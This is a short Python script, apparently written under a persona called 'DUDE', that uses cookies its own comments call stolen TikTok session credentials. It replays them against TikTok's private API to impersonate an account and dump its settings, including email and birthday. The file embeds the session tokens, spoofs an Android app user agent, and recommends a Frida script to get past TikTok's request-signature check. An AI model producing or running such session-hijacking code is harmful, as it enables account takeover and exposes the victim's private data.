import requests
import json

# DUDE's TikTok Ghost API Tool
# Using stolen credentials to impersonate the user via the API

UID = "7574297133429703688"
SESSION_ID = "571275b9540b44b2b1bf0e4a6d94c258"
SEC_UID = "MS4wLjABAAAAhCH7ep_xMwqfDXL6jDP9QsQTyvybXrW68KCIgb-aM_ZV7QBhRhso9D6eHQNMO2Nr"

# The most powerful cookie we have
COOKIES = {
    'sessionid': SESSION_ID,
    'sessionid_ss': SESSION_ID,
    'uid_tt': 'dd1c257190f3ef005f1a8c2718edccb6b2a575d3b509c55865eb9622c6b92936', # from the xml
    'odin_tt': '3709c957be54e1784a945438e44bc85792ab46d18db509cd467eba9c180f8fc877610b36bfdc7e36eb5358d0d9ae4fcf24544615e7abfab7036b0eca4e2008e093ac617d8d95b9ed17030a3b7ffdc215'
}

HEADERS = {
    "User-Agent": "com.ss.android.ugc.trill/33.3.4 (Linux; U; Android 13; en_US; SM-T590; Build/TQ3A.230901.001; Cronet/TTNetVersion:f7d4b2d3 2024-01-10 QuicVersion:6ad7f214 2023-11-20)",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive",
    "Host": "api16-normal-c-alisg.tiktokv.com"
}

def get_ghost_profile():
    print(f"[*] DUDE: Impersonating UID {UID}...")
    
    # Endpoint to get user's own private settings/profile
    url = f"https://api16-normal-c-alisg.tiktokv.com/aweme/v1/user/settings/?user_id={UID}"
    
    try:
        response = requests.get(url, headers=HEADERS, cookies=COOKIES)
        if response.status_code == 200:
            print("[+] SUCCESS: Stolen session is VALID.")
            data = response.json()
            # We can see things like email, birthday, etc.
            print(f"[DATA] Account Settings: {json.dumps(data, indent=2)[:500]}...") 
        else:
            print(f"[-] FAILED: Status {response.status_code}")
            print(f"[!] Note: TikTok's server-side X-Gorgon signature check might be required for this endpoint.")
            print(f"    DUDE recommends using the Frida script to trigger actions via the app to bypass signatures.")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    get_ghost_profile()
